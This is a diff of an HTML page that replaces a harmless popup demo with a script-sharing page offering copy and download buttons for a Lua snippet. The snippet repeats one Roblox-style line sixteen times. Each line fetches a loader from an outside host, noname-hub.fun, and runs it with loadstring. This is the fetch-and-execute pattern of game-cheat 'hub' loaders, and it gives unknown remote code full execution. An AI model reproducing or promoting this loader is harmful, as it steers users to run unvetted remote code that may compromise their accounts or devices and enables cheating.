@@ -1,159 +1,303 @@
-<html><head><base href="." />
-<meta charset="UTF-8">
-<title>Perfect Popup Window Example</title>
-<style>
-.popup-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    z-index: 1000;
-    animation: fadeIn 0.3s ease-in-out;
-}
+<html><head><base href="https://example.com">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-bg: #0d1117;
+            --secondary-bg: #161b22;
+            --border-color: #30363d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-color: #238636;
+            --hover-bg: #21262d;
+            --button-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --highlight-shadow: 0 0 15px rgba(35, 134, 54, 0.3);
+        }
 
-.popup-container {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0.7);
-    background-color: #ffffff;
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-    z-index: 1001;
-    width: 95%;
-    max-width: 100%;
-    opacity: 0;
-    animation: popIn 0.4s ease-out forwards;
-}
+        body {
+            background-color: var(--primary-bg);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0d1117 0%, #1a1f24 100%);
+        }
 
-.popup-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 15px;
-    padding-bottom: 10px;
-    border-bottom: 2px solid #f0f0f0;
-}
+        .syntaxHighlightWrapper {
+            background-color: var(--secondary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            margin-bottom: 16px;
+            width: 100%;
+            max-width: 100%;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
 
-.popup-title {
-    font-size: 1.5em;
-    color: #333;
-    margin: 0;
-}
+        .syntaxHighlightWrapper:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.25);
+        }
 
-.close-btn {
-    background: none;
-    border: none;
-    font-size: 24px;
-    cursor: pointer;
-    color: #666;
-    transition: color 0.3s;
-}
+        .syntaxHeaderContainer {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
+            background: linear-gradient(to right, var(--secondary-bg), #1c2129);
+        }
 
-.close-btn:hover {
-    color: #ff4444;
-}
+        .scriptMetadataContainer {
+            color: var(--text-secondary);
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
 
-.trigger-btn {
-    padding: 12px 24px;
-    font-size: 16px;
-    background-color: #4CAF50;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background-color 0.3s;
-}
+        .actionButtonsContainer {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
 
-.trigger-btn:hover {
-    background-color: #45a049;
-}
+        .interactiveButton {
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            border: 1px solid rgba(240,246,252,0.1);
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            min-width: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: var(--button-shadow);
+        }
 
-@keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-}
+        .interactiveButton:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--highlight-shadow);
+            filter: brightness(1.1);
+        }
 
-@keyframes popIn {
-    0% {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(0.7);
-    }
-    100% {
-        opacity: 1;
-        transform: translate(-50%, -50%) scale(1);
-    }
-}
+        .interactiveButton:active {
+            transform: translateY(1px);
+        }
 
-.content-wrapper {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-}
+        .viewRawButton {
+            background: linear-gradient(135deg, #2d333b 0%, #21262d 100%);
+            color: var(--text-primary);
+        }
 
-</style>
+        .copyScriptButton {
+            background: linear-gradient(135deg, #2d333b 0%, #21262d 100%);
+            color: var(--text-primary);
+        }
+
+        .downloadScriptButton {
+            background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+            color: #ffffff;
+        }
+
+        .syntaxContentWrapper {
+            padding: 20px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            background: linear-gradient(to bottom, var(--secondary-bg), #1c2129);
+        }
+
+        pre[class*="language-"] {
+            margin: 0;
+            background: transparent !important;
+            font-size: 14px;
+            font-family: 'Fira Code', monospace;
+        }
+
+        #clipboardNotification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            display: none;
+            font-size: 14px;
+            animation: notificationSlideIn 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 9999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            backdrop-filter: blur(8px);
+        }
+
+        @keyframes notificationSlideIn {
+            0% { transform: translateY(100px) scale(0.8); opacity: 0; }
+            100% { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+            
+            .syntaxHeaderContainer {
+                padding: 12px;
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .actionButtonsContainer {
+                width: 100%;
+                justify-content: stretch;
+            }
+
+            .interactiveButton {
+                flex: 1;
+                padding: 10px;
+                font-size: 12px;
+                min-width: auto;
+            }
+
+            #clipboardNotification {
+                left: 10px;
+                right: 10px;
+                bottom: 10px;
+                text-align: center;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--primary-bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 6px;
+            border: 3px solid var(--primary-bg);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #454b53;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -1000px 0; }
+            100% { background-position: 1000px 0; }
+        }
+    </style>
 </head>
 <body>
-<div class="content-wrapper">
-    <button class="trigger-btn" id="openButton">Open Popup</button>
-</div>
-
-<div class="popup-overlay" id="popupOverlay">
-    <div class="popup-container">
-        <div class="popup-header">
-            <h2 class="popup-title">Welcome to Our Popup!</h2>
-            <button class="close-btn" id="closeButton">&times;</button>
+    <div class="syntaxHighlightWrapper">
+        <div class="syntaxHeaderContainer">
+            <span class="scriptMetadataContainer" id="scriptMetadata">
+                <i class="fas fa-file-code" style="margin-right: 8px;"></i>
+                <span id="scriptMetadataText">
+                    <i class="fas fa-code"></i> <span id="scriptLineCount">16</span> lines 
+                    <i class="fas fa-arrows-left-right-to-line"></i> 
+                    <span id="scriptByteCount">1023</span> Bytes
+                </span>
+            </span>
+            <div class="actionButtonsContainer">
+                <button class="interactiveButton viewRawButton" onclick="showRawContent()"><i class="fas fa-code"></i>Raw</button>
+                <button class="interactiveButton copyScriptButton" onclick="copyScriptContent()"><i class="far fa-copy"></i>Copy Script</button>
+                <button class="interactiveButton downloadScriptButton" onclick="downloadScriptContent()"><i class="fas fa-download"></i>Download</button>
+            </div>
         </div>
-        <div class="popup-content">
-            <p>This is a perfect popup window with smooth animations and a modern design. You can customize this content to show any information you want!</p>
-            <p>Features of this popup:</p>
-            <ul>
-                <li>Smooth fade-in animation</li>
-                <li>Scale animation on open</li>
-                <li>Responsive design</li>
-                <li>Click outside to close</li>
-                <li>Modern styling</li>
-            </ul>
+        <div class="syntaxContentWrapper">
+            <pre class="line-numbers"><code class="language-lua" id="scriptContentArea">loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()
+loadstring(game:HttpGet("https://noname-hub.fun/loader.lua"))()</code></pre>
         </div>
     </div>
-</div>
+    <div id="clipboardNotification"><i class="fas fa-check notificationIconContainer"></i>Copied to clipboard!</div>
 
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-    const popupOverlay = document.getElementById('popupOverlay');
-    const openButton = document.getElementById('openButton');
-    const closeButton = document.getElementById('closeButton');
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-lua.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/line-numbers/prism-line-numbers.min.js"></script>
 
-    function openPopup() {
-        popupOverlay.style.display = 'block';
-        document.body.style.overflow = 'hidden';
-    }
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            let scriptContentArea = document.getElementById('scriptContentArea');
+            let scriptLineCount = document.getElementById('scriptLineCount');
+            let scriptByteCount = document.getElementById('scriptByteCount');
+            
+            let lines = scriptContentArea.textContent.split('\n').filter(line => line.trim() !== '');
+            scriptLineCount.innerText = lines.length;
+            scriptByteCount.innerText = scriptContentArea.textContent.length;
 
-    function closePopup() {
-        popupOverlay.style.display = 'none';
-        document.body.style.overflow = 'auto';
-    }
+            Prism.highlightElement(scriptContentArea);
+        });
 
-    openButton.addEventListener('click', openPopup);
-    closeButton.addEventListener('click', closePopup);
-
-    popupOverlay.addEventListener('click', function(event) {
-        if (event.target === this) {
-            closePopup();
+        function copyScriptContent() {
+            const scriptContent = document.getElementById('scriptContentArea').textContent;
+            navigator.clipboard.writeText(scriptContent).then(() => {
+                showClipboardNotification();
+            });
         }
-    });
 
-    document.addEventListener('keydown', function(event) {
-        if (event.key === 'Escape') {
-            closePopup();
+        function showClipboardNotification() {
+            const notification = document.getElementById('clipboardNotification');
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 2000);
         }
-    });
-});
-</script>
 
+        function showRawContent() {
+            const scriptContent = document.getElementById('scriptContentArea').textContent;
+            const rawWindow = window.open('', '_blank');
+            const rawStyle = document.createElement('style');
+            rawStyle.textContent = `
+                body {
+                    background-color: #0d1117;
+                    color: #ffffff;
+                    font-family: monospace;
+                    padding: 20px;
+                    white-space: pre-wrap;
+                }
+            `;
+            rawWindow.document.head.appendChild(rawStyle);
+            const preElement = document.createElement('pre');
+            preElement.textContent = scriptContent;
+            rawWindow.document.body.appendChild(preElement);
+        }
+
+        function downloadScriptContent() {
+            const scriptContent = document.getElementById('scriptContentArea').textContent;
+            const blob = new Blob([scriptContent], { type: 'text/plain' });
+            const downloadLink = document.createElement('a');
+            downloadLink.href = URL.createObjectURL(blob);
+            downloadLink.download = 'script.lua';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+        }
+    </script>
 </body></html>
